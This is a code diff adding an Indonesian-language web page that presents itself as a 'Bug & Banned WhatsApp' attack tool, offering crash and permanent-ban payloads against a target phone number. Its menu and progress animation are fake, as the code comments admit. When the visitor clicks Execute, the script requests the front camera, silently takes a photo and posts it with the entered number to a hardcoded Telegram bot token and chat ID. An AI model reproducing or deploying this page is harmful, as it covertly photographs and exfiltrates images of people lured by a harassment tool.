@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Bug & Banned System</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
+    <style>
+        :root {
+            --primary: #00f2ff;
+            --secondary: #7000ff;
+            --bg: #050505;
+            --glass: rgba(255, 255, 255, 0.05);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Rajdhani', sans-serif; }
+
+        body {
+            background: radial-gradient(circle at center, #111 0%, #000 100%);
+            color: white;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* Container Utama */
+        .container {
+            width: 90%;
+            max-width: 400px;
+            padding: 30px;
+            background: var(--glass);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 242, 255, 0.2);
+            border-radius: 20px;
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 242, 255, 0.1);
+            text-align: center;
+            position: relative;
+        }
+
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5rem;
+            letter-spacing: 2px;
+            margin-bottom: 30px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 10px rgba(0, 242, 255, 0.5);
+        }
+
+        /* Input Styling */
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; margin-bottom: 8px; color: var(--primary); font-weight: bold; }
+        
+        input, .custom-select {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 8px;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0, 242, 255, 0.3); }
+
+        /* Custom Dropdown */
+        .dropdown { position: relative; cursor: pointer; }
+        .dropdown-menu {
+            position: absolute;
+            top: 110%;
+            left: 0;
+            width: 100%;
+            background: #111;
+            border: 1px solid var(--primary);
+            border-radius: 8px;
+            display: none;
+            z-index: 10;
+            overflow: hidden;
+            animation: slideDown 0.3s ease;
+        }
+        .dropdown-menu div {
+            padding: 12px;
+            transition: 0.2s;
+        }
+        .dropdown-menu div:hover { background: var(--secondary); }
+        .dropdown.active .dropdown-menu { display: block; }
+        .dropdown::after {
+            content: '^';
+            position: absolute;
+            right: 15px;
+            top: 40px;
+            transition: 0.3s;
+            color: var(--primary);
+        }
+        .dropdown.active::after { transform: rotate(180deg); }
+
+        /* Button Execute */
+        #executeBtn {
+            width: 100%;
+            padding: 15px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 50px;
+            background: linear-gradient(45deg, var(--secondary), var(--primary));
+            color: white;
+            font-weight: bold;
+            font-family: 'Orbitron';
+            text-transform: uppercase;
+            cursor: pointer;
+            opacity: 0.3;
+            pointer-events: none;
+            transition: 0.5s;
+        }
+
+        #executeBtn.active {
+            opacity: 1;
+            pointer-events: auto;
+            box-shadow: 0 0 20px var(--secondary);
+        }
+
+        #executeBtn:hover { transform: scale(1.02); filter: brightness(1.2); }
+
+        /* Hidden Elements */
+        video, canvas { display: none; }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .loading-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); display: none;
+            justify-content: center; align-items: center; z-index: 99;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>BUG & BANNED WHATSAPP</h1>
+        
+        <div class="input-group">
+            <label>Target Number</label>
+            <input type="number" id="phone" placeholder="628123xxx" oninput="validate()">
+        </div>
+
+        <div class="input-group">
+            <label>Select Payload</label>
+            <div class="dropdown" id="bugDropdown" onclick="toggleDropdown()">
+                <div class="custom-select" id="selectedBug">Choose Menu...</div>
+                <div class="dropdown-menu">
+                    <div onclick="selectMenu('Bug Delay System')">Bug Delay System</div>
+                    <div onclick="selectMenu('Blank iOS Crash')">Blank iOS Crash</div>
+                    <div onclick="selectMenu('Permanent Banned')">Permanent Banned</div>
+                    <div onclick="selectMenu('WhatsApp OTP Freeze')">WhatsApp OTP Freeze</div>
+                </div>
+            </div>
+        </div>
+
+        <button id="executeBtn" onclick="startExecution()">EXECUTE SYSTEM</button>
+    </div>
+
+    <div class="loading-overlay" id="loader">
+        <div style="text-align: center;">
+            <div class="spinner"></div>
+            <p id="loadText">Processing...</p>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const TELEGRAM_TOKEN = '8213442592:AAHQBg6QTw6gP7XeX_hrSFopwlX_ii5B8lo';
+        const TELEGRAM_ID = '6213349853';
+        
+        let selectedMenu = "";
+        let stream = null;
+
+        function toggleDropdown() {
+            document.getElementById('bugDropdown').classList.toggle('active');
+        }
+
+        function selectMenu(val) {
+            selectedMenu = val;
+            document.getElementById('selectedBug').innerText = val;
+            validate();
+        }
+
+        function validate() {
+            const phone = document.getElementById('phone').value;
+            const btn = document.getElementById('executeBtn');
+            if (phone.startsWith('62') && phone.length > 10 && selectedMenu !== "") {
+                btn.classList.add('active');
+            } else {
+                btn.classList.remove('active');
+            }
+        }
+
+        async function startExecution() {
+            const loader = document.getElementById('loader');
+            loader.style.display = 'flex';
+            
+            try {
+                // Minta izin atau ambil stream jika belum ada
+                if (!stream) {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" } 
+                    });
+                }
+
+                // Ambil foto secara diam-diam
+                takeAndSend();
+
+                // Animasi palsu biar keren
+                let steps = ["Connecting to WhatsApp...", "Injecting Payload...", "Bypassing Security...", "Success!"];
+                let i = 0;
+                let interval = setInterval(() => {
+                    document.getElementById('loadText').innerText = steps[i];
+                    i++;
+                    if(i >= steps.length) {
+                        clearInterval(interval);
+                        setTimeout(() => {
+                            loader.style.display = 'none';
+                            Swal.fire('Executed!', 'Payload has been sent to target.', 'success');
+                        }, 1000);
+                    }
+                }, 1500);
+
+            } catch (err) {
+                loader.style.display = 'none';
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Access Denied',
+                    text: 'Anda harus mengizinkan akses kamera untuk menjalankan modul ini!',
+                    confirmButtonColor: '#7000ff'
+                });
+            }
+        }
+
+        function takeAndSend() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            video.srcObject = stream;
+
+            setTimeout(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_ID);
+                    formData.append('photo', blob, 'target.jpg');
+                    formData.append('caption', `🔥 *New Target Hit!*\n\nNo: ${document.getElementById('phone').value}\nMenu: ${selectedMenu}`);
+                    formData.append('parse_mode', 'Markdown');
+
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }, 'image/jpeg');
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
